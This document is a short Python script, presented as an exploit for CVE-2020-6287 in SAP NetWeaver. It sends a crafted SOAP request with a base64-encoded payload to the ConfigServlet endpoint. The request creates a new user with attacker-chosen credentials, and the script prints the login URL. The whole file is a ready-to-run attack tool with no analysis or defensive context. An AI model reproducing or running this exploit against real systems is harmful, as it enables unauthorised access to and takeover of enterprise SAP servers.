import requests
import base64

def create_user(target_url, username, password):
    """
    SAP User Creation via CVE-2020-6287
    """
    try:
        config_url = f"{target_url}/CTCWebService/CTCWebServiceBean/ConfigServlet"
        headers = {
            "Content-Type": "text/xml;charset=UTF-8",
            "User-Agent": "Mozilla/5.0"
        }

        payload = f"""
        <root>
            <user>
                <JavaOrABAP>java</JavaOrABAP>
                <username>{username}</username>
                <password>{password}</password>
                <userType></userType>
            </user>
        </root>
        """
        payload_encoded = base64.b64encode(payload.encode()).decode()

        data = f"""
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                          xmlns:urn="urn:CTCWebServiceSi">
            <soapenv:Header/>
            <soapenv:Body>
                <urn:executeSynchronious>
                    <identifier>
                        <component>sap.com/tc~lm~config~content</component>
                        <path>content/Netweaver/ASJava/NWA/SPC/SPC_UserManagement.cproc</path>
                    </identifier>
                    <contextMessages>
                        <baData>{payload_encoded}</baData>
                        <name>userDetails</name>
                    </contextMessages>
                </urn:executeSynchronious>
            </soapenv:Body>
        </soapenv:Envelope>
        """

        response = requests.post(config_url, headers=headers, data=data, verify=False, timeout=10)
        if response.status_code == 200 and "urn:CTCWebServiceSi" in response.text:
            print(f"[+] User created successfully!\n    Username: {username}\n    Password: {password}")
            print(f"[+] Login URL: {target_url}/nwa")
        else:
            print("[-] Failed to create user. The target might be patched or not vulnerable.")
    except Exception as e:
        print(f"[-] Error: {e}")


if __name__ == "__main__":
    target = input("Enter the target URL (e.g., https://example.com): ").strip()
    username = input("Enter the username for the new user: ").strip()
    password = input("Enter the password for the new user: ").strip()

    create_user(target, username, password)
